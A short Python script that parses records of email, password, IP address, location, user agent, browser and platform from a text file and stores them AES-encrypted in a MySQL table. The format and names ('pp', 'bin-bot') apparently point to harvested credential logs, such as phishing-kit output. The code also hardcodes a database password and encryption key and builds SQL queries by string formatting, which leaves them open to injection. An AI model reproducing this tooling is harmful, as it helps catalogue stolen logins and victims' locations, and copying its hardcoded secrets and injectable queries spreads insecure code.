import mysql.connector
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
import hashlib
import base64
conn = mysql.connector.connect(host='localhost', database='bin', user='binbot', password='F00tbal!!')
query_conn = conn.cursor(buffered=True)

__key__ = hashlib.sha256(b'bin-bot-encrypt!').digest()

def encrypt(raw):
    BS = AES.block_size
    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

    raw = base64.b64encode(pad(raw).encode('utf8'))
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key= __key__, mode= AES.MODE_CFB,iv= iv)
    return base64.b64encode(iv + cipher.encrypt(raw))

try:
    pp_file = open("pp.txt", "r")
    pp_data_list = list(pp_file)
except Exception as e:
    print("1:"+str(e))
    exit


for index, data in enumerate(pp_data_list):
    try:
        if data.index("Email: ") >= 0:
            id, email, password, ip, location, user_agent, browser, platform = pp_data_list[index-1], pp_data_list[index], pp_data_list[index+1], pp_data_list[index+3], pp_data_list[index+4], pp_data_list[index+5], pp_data_list[index+6], pp_data_list[index+7]
            id = id.replace("| id : ", "").replace("\n", "")
            email, password, ip, location, user_agent, browser, platform = encrypt(email).decode('utf-8'), encrypt(password).decode('utf-8'), encrypt(ip).decode('utf-8'), encrypt(location).decode('utf-8'), encrypt(user_agent).decode('utf-8'), encrypt(browser).decode('utf-8'), encrypt(platform).decode('utf-8')
            #item = [pp_data_list[index].replace("| Email: ", "").replace("\n", ""), pp_data_list[index+1].replace("Email: ", "").replace("\n", ""), pp_data_list[index+2].replace("Email: ", "").replace("\n", ""), pp_data_list[index+3].replace("Email: ", "").replace("\n", ""), pp_data_list[index+4].replace("Email: ", "").replace("\n", ""), pp_data_list[index+5].replace("Email: ", "").replace("\n", ""), pp_data_list[index+6].replace("Email: ", "").replace("\n", "")]
            # query = "insert into `pp` (`id`, `email`, `password`, `ip_address`, `location`, `user_agent`, `browser`, `platform`) values ('%s', '%s', '%s', '%s', '%s', '%s', '%s') on duplicate key update `email`='%s'" % (id, email, password, ip, location, user_agent, browser, platform, email)
            query = "insert into `pp` (`id`, `email`, `password`, `ip_address`, `location`, `user_agent`, `browser`, `platform`) values ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (id, email, password, ip, location, user_agent, browser, platform)
            print("Success")
            query_conn.execute(query)
            conn.commit()
    except Exception as e:
        print(e)
